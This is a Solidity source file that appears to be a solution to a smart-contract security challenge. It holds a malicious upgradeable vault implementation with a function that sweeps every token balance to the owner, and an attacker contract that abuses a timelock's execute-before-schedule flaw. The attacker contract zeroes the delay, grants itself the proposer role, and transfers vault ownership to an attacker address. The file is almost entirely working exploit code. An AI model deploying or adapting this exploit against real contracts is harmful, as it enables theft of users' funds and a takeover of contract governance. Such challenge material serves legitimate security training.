// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function initialize() external initializer {
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    function sweepFunds(address tokenAddress) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
    }

    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}

interface ITimelock {
    function execute(address[] calldata, uint256[] calldata, bytes[] calldata, bytes32) external payable;

    function schedule(address[] calldata, uint256[] calldata, bytes[] calldata, bytes32) external;
}

contract Attacker12 {
    ITimelock public immutable timelock;
    address public immutable vault;
    address private immutable attacker;

    address[] private targets;
    uint256[] private values;
    bytes[] private data;

    bytes32 private constant salt = keccak256("42");

    constructor(address _timelock, address _vault, address _attacker) {
        timelock = ITimelock(_timelock);
        vault = _vault;
        attacker = _attacker;
    }

    function attack() external {
        // set delay to 0
        targets.push(address(timelock));
        values.push(0);
        data.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        // grant this contract proposer
        targets.push(address(timelock));
        values.push(0);
        data.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));

        // transfer vault ownership to the attacker
        targets.push(vault);
        values.push(0);
        data.push(abi.encodeWithSignature("transferOwnership(address)", attacker));

        // schedule to proposal so the subsequent logic does not revert
        targets.push(address(this));
        values.push(0);
        data.push(abi.encodeWithSignature("schedule()"));

        timelock.execute(targets, values, data, salt);
    }

    function schedule() external {
        timelock.schedule(targets, values, data, salt);
    }
}
